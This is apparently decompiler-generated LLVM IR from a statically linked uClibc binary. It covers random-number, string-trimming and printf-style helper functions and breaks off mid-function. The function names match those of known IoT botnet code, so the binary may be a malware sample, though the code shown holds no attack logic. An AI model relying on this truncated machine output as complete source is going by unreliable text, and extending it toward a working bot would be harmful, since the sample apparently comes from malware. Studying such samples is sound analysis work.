  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134545802, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134577092, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805b560.7, align 32
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805b564.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805b568.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_805b290.10, align 16
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_805b290.10, align 16
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805b28c.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d18 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d18, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.019, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.019 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.019, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.019, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485548 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485549 = icmp eq i32 %v4_80485548, 0
  %v1_804855816 = icmp eq i1 %v5_80485549, false
  br i1 %v1_804855816, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
